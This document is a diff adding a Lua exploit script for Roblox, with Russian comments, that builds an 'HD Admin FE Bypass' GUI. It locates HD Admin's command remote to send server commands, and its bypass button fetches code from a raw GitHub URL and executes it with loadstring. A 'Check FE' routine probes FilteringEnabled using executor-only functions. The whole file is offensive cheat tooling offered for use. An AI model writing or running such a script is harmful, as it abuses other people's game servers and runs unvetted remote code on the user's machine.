@@ -1,0 +1,161 @@
+-- SWILL — HD Admin FE Bypass GUI (Один префикс: /)
+-- FE Bypass: ТОЛЬКО загрузка и выполнение ссылки
+-- Check FE: мгновенная одноразовая проверка, без задержек
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+
+-- ========== HD ADMIN REMOTE ==========
+local RequestCommand = nil
+pcall(function()
+    local HDAdminHDClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+    if HDAdminHDClient and HDAdminHDClient.Signals then
+        RequestCommand = HDAdminHDClient.Signals:FindFirstChild("RequestCommand")
+    end
+    if not RequestCommand then
+        for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
+            if child.Name == "RequestCommand" and child:IsA("RemoteFunction") then
+                RequestCommand = child
+                break
+            end
+        end
+    end
+end)
+
+-- Отправка команды с префиксом "/"
+local function sendCommand(cmd)
+    if not RequestCommand then return end
+    pcall(RequestCommand.InvokeServer, RequestCommand, "/" .. cmd)
+end
+
+-- ========== FE BYPASS: ТОЛЬКО ВЫПОЛНЕНИЕ ССЫЛКИ ==========
+local function runFEBypass()
+    local url = "https://raw.githubusercontent.com/4izikRBX/FEKiller/refs/heads/main/FEBypass"
+    local ok, res = pcall(game.HttpGet, game, url)
+    if ok and res then
+        local fn, err = loadstring(res)
+        if fn then
+            pcall(fn)
+        end
+    end
+end
+
+-- ========== CHECK FE: ОДНОРАЗОВАЯ ПРОВЕРКА ==========
+local function checkFEOnce()
+    if Workspace.FilteringEnabled == false then return true end
+    if ReplicatedStorage.FilteringEnabled == false then return true end
+    if Lighting.FilteringEnabled == false then return true end
+    if _G.FE_BYPASS_ACTIVE == true then return true end
+    if _G.FilteringEnabled == false then return true end
+    local mt = getrawmetatable(Workspace)
+    if mt and mt.__index then
+        local val = mt.__index(Workspace, "FilteringEnabled")
+        if val == false then return true end
+    end
+    return false
+end
+
+-- ========== GUI ==========
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SWILL_HDAdmin_GUI"
+ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 300, 0, 200)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "HD Admin: FE Bypass"
+Title.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BorderSizePixel = 0
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 18
+Title.Parent = MainFrame
+
+local BypassBtn = Instance.new("TextButton")
+BypassBtn.Size = UDim2.new(0, 250, 0, 45)
+BypassBtn.Position = UDim2.new(0.5, -125, 0, 55)
+BypassBtn.Text = "FE Bypass"
+BypassBtn.BackgroundColor3 = Color3.fromRGB(60, 80, 120)
+BypassBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+BypassBtn.BorderSizePixel = 0
+BypassBtn.Font = Enum.Font.SourceSansBold
+BypassBtn.TextSize = 16
+BypassBtn.Parent = MainFrame
+
+local CheckBtn = Instance.new("TextButton")
+CheckBtn.Size = UDim2.new(0, 250, 0, 45)
+CheckBtn.Position = UDim2.new(0.5, -125, 0, 110)
+CheckBtn.Text = "Check FE"
+CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 60, 60)
+CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CheckBtn.BorderSizePixel = 0
+CheckBtn.Font = Enum.Font.SourceSansBold
+CheckBtn.TextSize = 16
+CheckBtn.Parent = MainFrame
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 25)
+Status.Position = UDim2.new(0, 0, 1, -25)
+Status.Text = "/ SWILL — БЕЗ ГРАНИЦ | Готов"
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(150, 255, 150)
+Status.Font = Enum.Font.SourceSans
+Status.TextSize = 11
+Status.Parent = MainFrame
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Text = "X"
+CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Font = Enum.Font.SourceSansBold
+CloseBtn.TextSize = 16
+CloseBtn.Parent = MainFrame
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- ========== НАЖАТИЯ КНОПОК (БЕЗ ЗАДЕРЖЕК) ==========
+BypassBtn.MouseButton1Down:Connect(function()
+    Status.Text = "Статус: Выполнение FE Bypass..."
+    Status.TextColor3 = Color3.fromRGB(255, 200, 100)
+    runFEBypass()
+    Status.Text = "Статус: FE Bypass выполнен"
+    Status.TextColor3 = Color3.fromRGB(100, 255, 100)
+    sendCommand("ServerMessage FE Bypass Executed")
+    Status.Text = "/ SWILL — БЕЗ ГРАНИЦ | Готов"
+    Status.TextColor3 = Color3.fromRGB(150, 255, 150)
+end)
+
+CheckBtn.MouseButton1Down:Connect(function()
+    Status.Text = "Статус: Проверка FE..."
+    Status.TextColor3 = Color3.fromRGB(255, 200, 100)
+    local disabled = checkFEOnce()
+    if disabled then
+        Status.Text = "Статус: FilteringEnabled ВЫКЛЮЧЕН"
+        Status.TextColor3 = Color3.fromRGB(100, 255, 100)
+        sendCommand("ServerMessage FilteringEnabled is Disabled")
+    else
+        Status.Text = "Статус: FilteringEnabled ВКЛЮЧЕН"
+        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
+        sendCommand("ServerMessage FilteringEnabled is Enabled")
+    end
+    Status.Text = "/ FE Bypass | Готов"
+    Status.TextColor3 = Color3.fromRGB(150, 255, 150)
+end)
+
+print("[SWILL] GUI загружен.")
